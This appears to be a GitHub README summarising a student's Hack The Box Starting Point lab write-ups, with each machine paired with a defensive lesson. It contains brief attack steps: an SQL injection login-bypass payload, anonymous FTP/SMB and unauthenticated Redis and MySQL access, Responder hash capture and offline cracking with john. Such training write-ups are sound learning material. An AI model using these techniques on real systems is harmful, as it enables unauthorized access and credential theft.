# Hack The Box — Starting Point Labs

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Hack%20The%20Box-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black" />
  <img src="https://img.shields.io/badge/Tier-0%20%26%201-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black" />
  <img src="https://img.shields.io/badge/Tool-Nmap%20%7C%20Metasploit%20%7C%20Gobuster-557C94?style=for-the-badge&logo=kalilinux&logoColor=white" />
  <img src="https://img.shields.io/badge/Machines%20Completed-8-blue?style=for-the-badge" />
</p>

> Hack The Box Starting Point writeups covering **8 machines** across Tier 0 and Tier 1 — demonstrating practical offensive security skills including network reconnaissance, service enumeration, FTP/Telnet/SMB exploitation, SQL injection, database enumeration, and authentication attacks.

---

## Overview

This repository documents my completed **Hack The Box Starting Point** labs as part of my M.S. Cybersecurity studies. Each machine writeup covers the full attack methodology — from initial reconnaissance through to flag capture — with tools, techniques, and key takeaways documented for each.

**Platform:** [Hack The Box](https://www.hackthebox.com/) | **Environment:** Kali Linux via HTB VPN

---

## Machines Completed

### Tier 0 — Fundamentals

| Machine | Key Technique | Services |
|---------|---------------|----------|
| Meow | Telnet Authentication | Telnet |
| Fawn | FTP Anonymous Login | FTP |
| Dancing | SMB Share Enumeration | SMB |
| Redeemer | Redis Unauthenticated Access | Redis |

### Tier 1 — Intermediate

| Machine | Key Technique | Services | Flag |
|---------|---------------|----------|------|
| Appointment | SQL Injection Auth Bypass | HTTP, MySQL |
| Sequel | MariaDB Enumeration | MySQL/MariaDB |
| Crocodile | FTP Credential Discovery + Web Auth | FTP, HTTP |
| Responder | NetNTLMv2 Hash Capture | SMB, HTTP |

---

## Machine Writeups

### Tier 0

---

#### Meow
**Objective:** Gain access to a Linux machine via an unsecured Telnet service.

```
Recon     →  nmap -sV <target>       # Discover open Telnet port 23
Access    →  telnet <target>          # Connect with default/empty credentials
Flag      →  cat flag.txt
```

| Step | Tool | Command |
|------|------|---------|
| Port scan | Nmap | `nmap -sV <target>` |
| Service access | Telnet | `telnet <target>` |
| Flag retrieval | Linux CLI | `ls`, `cat flag.txt` |

**Key Lesson:** Telnet transmits data in cleartext and should never be used in production — replace with SSH.

---

#### Fawn
**Objective:** Exploit anonymous FTP login to retrieve the flag.

```
Recon     →  nmap -sV <target>       # Discover FTP port 21
Access    →  ftp <target>             # Login as anonymous
Flag      →  get flag.txt
```

| Step | Tool | Command |
|------|------|---------|
| Port scan | Nmap | `nmap -sV <target>` |
| FTP login | FTP client | `ftp <target>` → user: `anonymous` |
| Flag retrieval | FTP | `ls`, `get flag.txt` |

**Key Lesson:** Anonymous FTP access is a critical misconfiguration that exposes sensitive files without authentication.

---

#### Dancing
**Objective:** Enumerate SMB shares and access files without valid credentials.

```
Recon     →  nmap -sV <target>       # Discover SMB port 445
Enumerate →  smbclient -L <target>   # List available shares
Access    →  smbclient \\<target>\ShareName
Flag      →  get flag.txt
```

| Step | Tool | Command |
|------|------|---------|
| Port scan | Nmap | `nmap -sV <target>` |
| Share listing | smbclient | `smbclient -L //<target>/ -N` |
| Share access | smbclient | `smbclient //<target>/<share> -N` |

**Key Lesson:** SMB shares with null session access expose corporate file systems to unauthenticated attackers.

---

#### Redeemer
**Objective:** Access an unauthenticated Redis database and extract the flag.

```
Recon     →  nmap -p 6379 <target>   # Discover Redis port
Access    →  redis-cli -h <target>   # Connect without authentication
Flag      →  keys *, get flag
```

**Key Lesson:** Redis instances exposed without authentication or network restrictions are trivially compromised.

---

### Tier 1

---

#### Appointment
**Objective:** Bypass web application login using SQL injection.

```
Recon     →  nmap -sV <target>            # Discover HTTP service
Enumerate →  gobuster dir -u http://<target> -w wordlist.txt
Exploit   →  SQL injection: admin'#       # Bypass authentication
Flag      →  Retrieved from web dashboard
```

| Step | Tool | Technique |
|------|------|-----------|
| Port scan | Nmap | Service discovery |
| Directory enum | Gobuster | Hidden path discovery |
| Auth bypass | Browser | SQLi: `admin'#` |

**Key Lesson:** Unsanitized SQL queries allow attackers to bypass authentication entirely — parameterized queries prevent this.

---

#### Sequel
**Objective:** Enumerate a MariaDB instance and extract database contents.

```
Recon     →  nmap -sV <target>                     # Discover MySQL port 3306
Access    →  mysql -h <target> -u root             # Login with default credentials
Enumerate →  show databases; use db; show tables;
Flag      →  select * from table;
```

**Key Lesson:** Default database credentials (`root` with no password) are a common and critical misconfiguration.

---

#### Crocodile
**Objective:** Discover credentials via FTP and use them to authenticate to a web application.

```
Recon     →  nmap -sV <target>           # Discover FTP + HTTP
FTP Enum  →  ftp <target>               # Anonymous login, retrieve credential files
Web Auth  →  Use found credentials at login page
Flag      →  Retrieved from web dashboard
```

**Key Lesson:** Credentials stored in FTP-accessible files enable web application compromise — credential storage must be secured.

---

#### Responder
**Objective:** Capture NetNTLMv2 hashes via SMB authentication and crack them offline.

```
Recon     →  nmap -sV <target>                     # Discover HTTP/SMB
Setup     →  responder -I tun0                     # Start hash capture listener
Trigger   →  Access UNC path via web app           # Force SMB authentication
Capture   →  NetNTLMv2 hash captured
Crack     →  john hash.txt --wordlist=rockyou.txt  # Offline cracking
```

**Key Lesson:** SMB authentication can be abused to capture and crack password hashes — network segmentation and SMB signing mitigate this.

---

## Repository Contents

```
Hack-the-box-starting-point-labs
├── 📄 README.md
├── 📋 Hack the Box Tier 0 - Hashan Kodippilige.pdf   ← Tier 0 writeups
└── 📋 Hack the Box Tier 1 - Hashan Kodippilige.pdf   ← Tier 1 writeups
```

---

## Skills Demonstrated

`Network Reconnaissance` `Nmap` `Telnet Exploitation` `FTP Enumeration` `SMB Enumeration` `Redis Exploitation` `SQL Injection` `Gobuster` `Directory Enumeration` `MariaDB Enumeration` `NetNTLMv2 Hash Capture` `Responder` `Password Cracking` `Kali Linux` `Offensive Security` `Hack The Box`

---

## Real-World Relevance

These labs build foundational skills directly applicable to:
- **Penetration Tester** roles — reconnaissance, enumeration, and exploitation methodology
- **SOC Analyst** roles — understanding attacker techniques to detect them (TTPs)
- **Security Engineer** roles — identifying and remediating common misconfigurations
- **PhD Research** — empirical study of offensive security techniques and defensive countermeasures

---

## Disclaimer

All activities were performed exclusively within the **authorized Hack The Box training platform** for educational and cybersecurity learning purposes. No unauthorized systems were accessed.

---

## Author

**Hashan Kodippilige**  
M.S. Cybersecurity — Minnesota State University Moorhead  
📧 hashansharindu@gmail.com  
🔗 [LinkedIn](https://www.linkedin.com/in/hashankodippilige/)  
🐙 [GitHub](https://github.com/hashan-kodippilige)
